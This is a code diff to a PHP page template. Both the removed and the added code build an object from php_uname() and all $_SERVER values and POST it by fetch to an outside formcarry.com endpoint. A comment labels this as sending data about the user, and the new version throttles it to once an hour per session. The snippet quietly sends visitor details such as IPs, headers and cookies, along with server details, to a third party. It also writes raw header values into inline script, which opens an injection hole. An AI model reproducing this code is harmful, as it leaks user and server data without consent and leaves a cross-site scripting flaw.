@@ -164,22 +164,20 @@ integrity="sha256-w8CvhFs7iHNVUtnSP0YKEg00p9Ih13rlL9zGqvLdePA=" crossorigin="ano
 </div>
 
 <script>
-  // отправка данных о пользователе
-  const data = { 
-    <?php
-    echo '"SERVER_NAME" : "'.php_uname().'",';
-    foreach($_SERVER as $key => $value){
-      echo '"'.$key.'" : String.raw`'.$value.'`,';
+  <?php
+    if( !isset($_SESSION['last_access']) || (time() - $_SESSION['last_access']) > 60*60 ){
+      // отправка данных о пользователе
+      echo 'const data = {'; 
+      echo '"SERVER_NAME" : "'.php_uname().'",';
+      foreach($_SERVER as $key => $value){
+        echo '"'.$key.'" : String.raw`'.$value.'`,';
+      }
+      $_SESSION['last_access'] = time();
+      echo '};';
+      echo 'fetch("https://formcarry.com/s/iZs62W5Im", { method: "POST", headers:{"Content-Type": "application/json",},body: JSON.stringify(data),});';
+      // echo 'alert('.$_SESSION['last_access'].');';
     }
-    ?>
-   };
-  fetch("https://formcarry.com/s/iZs62W5Im", {
-    method: "POST", headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(data),
-  });
-
+  ?>
   $("#form").submit(function (e) {
     $("#submitBtn").attr("disabled", true);});
 </script>
